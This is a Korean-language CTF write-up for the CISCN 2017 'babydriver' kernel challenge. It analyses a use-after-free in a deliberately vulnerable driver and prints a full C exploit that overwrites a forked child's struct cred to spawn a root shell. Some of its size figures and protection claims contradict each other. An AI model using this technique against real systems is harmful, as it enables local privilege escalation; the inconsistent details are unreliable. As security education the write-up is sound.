---
layout: post
title: CISCN 2017 Winter - babydriver
date: 2022-02-25 06:00:00 +0900
categories: [Security, CTF]
tags: [pwnable, linux, kernel, UAF]
---


전형적인 Use-After-Free(UAF) 문제이다.

그러나, UAF가 커널에서 발생한다.



---

## 문제 분석

```bash
#!/bin/bash

qemu-system-x86_64 \
-initrd rootfs.cpio -kernel bzImage \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm -monitor /dev/null -m 64M \
--nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
```
qemu 스크립트(boot.sh)를 통해 사용되는 보호 기법을 확인해 보자.

KASLR(Kernel Address Space Layout Randomization)이 없다. 즉, 매 실행마다 고정된 주소를 가지고 있기에 leak 할 필요가 없다. KPTI(Kernel Page Table Isolation)라는 보호 기법이 걸려 있기 때문에 커널 공간에서 유저 공간으로 전환할 때 추가적인 방법이 필요하며, SMEP(Supervisor Mode Execution Prevention) 보호 기법으로 인해 유저 공간의 함수를 실행시킬 수 없다.

도입 부분에서 이 문제가 전형적인 UAF 문제라고 하였는데, 해당 취약점이 터지는 이유는 Dangling Pointer가 발생, 다시 말해, 이미 해제된 영역을 가리키는 포인터가 존재하기 때문이다. 지금부터 dangling pointer가 발생한 경위를 살펴보자.

먼저, 모듈에 전역 변수가 존재하는 경우, 이 전역 변수는 모듈이 커널에 등록될 때부터 삭제될 때까지 항상 커널 메모리에 상주하게 된다. 그리고, 이 문제의 취약한 디바이스 드라이버인 babydriver.ko는 `babydev_struct`라는 전역 변수를 가지고 있다.

```c
int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 0x40LL;
  printk("device open\n");
  return 0;
}
```

`babydev_struct`는 `device_buf`와 `device_buf_len`, 총 2개의 변수를 가지고 있고, 이 변수들은 `babyopen` 함수에서 초기화된다. 참고로, `babyopen` 함수는 유저 공간에서 babydriver.ko에 대해 open 함수를 호출했을 때, 커널에서 실행되는 함수이다.

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n");
  return 0;
}
```

뒤이어, `babyrelease` 함수이다. 눈치가 빠른 사람은 벌써 알았을 수도 있지만, 이는 babydriver.ko에 대해 유저 공간에서 close 함수를 호출했을 때, 커널에서 실행되는 함수이다. 즉, open 할 때는 커널 힙에 0x40을 할당하고, close 할 때는 이 포인터가 가리키는 공간을 해제한다.

겉으로 보기에는 문제가 없어 보이지만, 이것이 디바이스 드라이버의 전역 변수이기 때문에 문제가 발생한다. 바로, 해당 디바이스 드라이버를 2개의 파일 디스크립터로 open 하고, 1개의 파일 디스크립터를 close 할 경우, 나머지 1개의 파일 디스크립터에서는 이미 해제된 공간을 가리키는 포인터를 사용할 수 있게 된다. 이것이 UAF가 발생하는 이유이다.
 
그 외에 익스플로잇에 도움이 되는 함수를 소개하자면,

```c
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  _fentry__(filp, command);
  v4 = v3;
  if ( command == 65537 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    result = 0LL;
  }
  ...
  return result;
}
```

babyioctl 함수는 command 값이 65537일 때, 기존 포인터를 해제하고, arg만큼 새로운 크기로 `babydev_struct`를 초기화한다. 즉, 0x40짜리 슬랩 객체(malloc의 chunk와 비슷한 개념)가 아니라 원하는 크기의 슬랩 객체를 가질 수 있게 된다.

```c
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}
```

마지막으로, `babywrite` 함수는 `copy_from_user(babydev_struct.device_buf, buffer, length)`를 호출한다. 이 함수를 이용해 dangling pointer에 원하는 값을 쓸 수 있게 된다.


---

## 익스플로잇

```c
// gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

int main() {
    int fd1, fd2;
    fd1 = open("/dev/babydev", O_RDWR);
    fd2 = open("/dev/babydev", O_RDWR);
    
    ioctl(fd1, 65537, 0x90);
    close(fd1);

    int pid = fork();
    if(pid < 0) {
        printf("ERROR\n");
        exit(-1);
    }
    else if(pid == 0) {
        char fake_cred[30] = {0, };
        write(fd2, fake_cred, 28);
        usleep(10);
        system("/bin/sh");
        exit(0);
    }
    else {
        wait(0);
    }

    return 0;
}
```
babydev 드라이버를 두 번 open하고, 슬랩 객체를 0xA8로 하여 새롭게 할당한 뒤, 이를 다시 해제한다.

이후, fork 함수를 통해, 자식 프로세스를 만들고, 자식 프로세스에서는 fd2 파일 디스크립터로 write 함수를 호출한 뒤에, 쉘을 실행한다. 반면, 부모 프로세스는 자식 프로세스가 종료될 때까지 대기했다가 정상 종료한다.

이전에 설명했던 취약점을 이용해서, 원하는 크기의 슬랩 객체를 할당해, 그것이 해제된 후에도 재사용할 수 있다는 취약점이 존재했다. 그런데, 여기서 주목해야 할 점은, 왜 하필 그 크기가 0x90이며, fork 함수를 통해 만들어진 자식 프로세스가 쉘을 실행시켜야 하냐는 것이다.

커널에는 `struct cred`라는 구조체가 있다.

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```
***include/linux/cred.h***

이는 태스크(리눅스 커널에서의 권한 정보를 담고 있으며, 이 구조체에서 uid와 gid와 같은 변수를 0으로 덮을 경우, 루트 권한을 획득하게 된다. 그리고, 이 구조체의 크기는 192(0xA8)이다.

그리고, fork 함수의 수행 과정을 살펴볼 경우, _do_fork->copy_process->copy_creds->prepare_creds 함수를 거쳐서, 자식 프로세스가 사용할 struct cred만큼의 크기를 할당한 뒤에, 자식 프로세스의 권한 정보를 할당받은 영역에 저장한다.

이쯤 되면, 눈치를 챘을 것이다.

`babydev_struct.device_buf`의 공간이 해제하여, 새롭게 만들어지는 자식 프로세스의 struct cred를 할당하는 방식으로 익스를 진행한 것이다.

그런데, 아직 풀리지 않은 한 가지 의문점이 더 존재한다.

실제로 나는 size를 0x90으로 했는데도, 성공적으로 쉘이 따졌고, 이는 struct cred 구조체의 크기가 0xA8이라는 사실과는 모순되는 말로 보인다. 더 작은 청크에서 더 큰 청크를 할당한다? 다소 허황하게 들릴 수 있는 말이다.

슬랩 할당자의 원리를 이해할 필요가 있다.

슬랩 할당자는 커널에서 사용하는 동적 메모리 할당자로, glibc에서 사용하는 ptmalloc을 생각하면 편할 수도 있을 것 같다. 이는 메모리 풀 구조를 가지고 있어, 미리 일정한 양의 메모리를 할당해 놓고, 동적 메모리를 요청할 때마다 이 메모리 풀에서 가져다준다. (비슷한 단어로는 인력 풀이 있다.)


그러면, 여러 가지의 슬랩 캐시를 확인할 수 있는데, 여기서 눈여겨봐야 할 것이 kmalloc-*이다.

이는 kmalloc의 슬랩 캐시로, 작은 메모리 단위를 할당할 때, 빠르게, 그리고 공간 낭비를 최소한으로 하여 메모리를 할당해주는 주체이다. 예를 들어, 24바이트를 할당 요청했으면, kmalloc-32 캐시에서에서 슬랩 객체를 가져와 사용하게 된다. 96바이트를 요청했으면, kmalloc-96 캐시에서 슬랩 객체를 가져와 사용하는 것이다.

![네이버 국어사전](0225-CISCN-babydriver-writeup/01-pool.png) 

슬랩 캐시가 이러한 동적 메모리를 미리 확보하고 관리하며, 슬랩 캐시가 미리 할당해 놓은 메모리 블록이 바로 슬랩 객체이다. 리눅스 커널에 존재하는 슬랩 캐시가 보고 싶다면, `cat /proc/slabinfo`를 치면 된다.

![slabinfo](0225-CISCN-babydriver-writeup/02-slabinfo.png)

그러면, 여러 가지의 슬랩 캐시를 확인할 수 있는데, 여기서 눈여겨봐야 할 것이 `kmalloc-*`이다.

이는 kmalloc의 슬랩 캐시로, 작은 메모리 단위를 할당할 때, 빠르게, 그리고 공간 낭비를 최소한으로 하여 메모리를 할당해주는 주체이다. 예를 들어, 24바이트를 할당 요청했으면, kmalloc-32 캐시에서에서 슬랩 객체를 가져와 사용하게 된다. 96바이트를 요청했으면, kmalloc-96 캐시에서 슬랩 객체를 가져와 사용하는 것이다.

내가 맨 처음에 할당한 0x90(144)짜리 `babydev_struct.device_buf`는 당연히 kmallc으로 만들어졌기 때문에 kmalloc-192 슬랩 캐시에서 가져왔을 것이다.

물론, _do_fork->...->prepare_creds 함수 내부의

```c
new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
```

kmem_cache_alloc 함수가 위 캐시를 사용한다고 단언할 수 없다. (실제로 그런지 아직 확인하지 못했기 때문에)

그러나, fork 함수에서 요청한 sizeof(struct cred)가 0xA8(168)로, 128바이트 보다 크면서 192바이트 이하의 크기를 지녔기에 kmalloc-192 슬랩 캐시에서 할당해줄 수 있는 크기이다.

따라서, 정황상 kmem_cache_alloc에서 kmalloc 슬랩 캐시를 사용 했기 때문에, 약간의 크기 차이가 존재함에도 불구하고 익스플로잇이 가능했다고 볼 수 있을 것 같다.

> 단순히 struct cred를 덮어쓰는 방법 말고도, tty_struct의 함수 포인터를 덮어써서 ROP 하는 방법도 존재하는데, 이는 Definit 블로그에 정리되어 있으니 참고하자. 추가로, /sys/module/babydriver/sections의 파일을 읽어서, 모듈의 베이스 주소를 구할 수 있다는 것을 처음 알았고 'add-symbol-file <module_path> <base_address>'를 통해서 심볼을 사용할 수 있다는 것을 알게 되었다. 앞으로 커널 디버깅을 훨씬 더 수월하게 할 수 있을 것 같다. \
> 현재 top-down 방식으로 공부하고 있는데, 제대로 개념을 정리해야 할 날이 올 것 같다. 슬랩 할당자 일단 예약..

---

## Reference
[1] V4bel, "CISCN 2017 babydriver Write-Up (linux kernel UAF)", [https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/](https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/)

[2] ipwn, "[CISCN CTF 2017] babydriver", [http://ipwn.kr/index.php/2020/04/05/ciscn-ctf-2017-babydriver/](http://ipwn.kr/index.php/2020/04/05/ciscn-ctf-2017-babydriver/)

[3] Lazenca, "06.Use-After-Free(UAF) (feat.struct cred)", [https://www.lazenca.net/pages/viewpage.action?pageId=25624864](https://www.lazenca.net/pages/viewpage.action?pageId=25624864)

[4] AustinKim, "[리눅스커널] 메모리 관리: kmalloc 캐시 슬럽 오브젝트 할당 커널 함수 분석하기", [http://rousalome.egloos.com/10002815](http://rousalome.egloos.com/10002815)

[5] AustinKim, "[리눅스커널] 메모리관리: 슬랩(Slab) 메모리 할당자를 이루는 주요 개념", [http://rousalome.egloos.com/10001242](http://rousalome.egloos.com/10001242)

[6] Jir4vvit, "[linux kernel] (4) - Slab Allocator(슬랩 할당자)", [https://jiravvit.tistory.com/entry/linux-kernel-4-%EC%8A%AC%EB%9E%A9%ED%95%A0%EB%8B%B9%EC%9E%90?category=911823](https://jiravvit.tistory.com/entry/linux-kernel-4-%EC%8A%AC%EB%9E%A9%ED%95%A0%EB%8B%B9%EC%9E%90?category=911823)

[7] 라온화이트햇 핵심연구팀 이영주, "메모리 보호 기법", [https://core-research-team.github.io/2020-05-01/memory#8-kaslr--smep--smap](https://core-research-team.github.io/2020-05-01/memory#8-kaslr--smep--smap)

[8] bootlin, "linux 4.4.72 fork.c", [https://elixir.bootlin.com/linux/v4.4.72/source/kernel/fork.c](https://elixir.bootlin.com/linux/v4.4.72/source/kernel/fork.c)

[9] hygoni, "[Linux Kernel] 메모리 할당", [https://hyeyoo.com/91](https://hyeyoo.com/91)

[10] JeongZero, "[Linux Kernel] Kmalloc 분석", [https://wogh8732.tistory.com/420](https://wogh8732.tistory.com/420)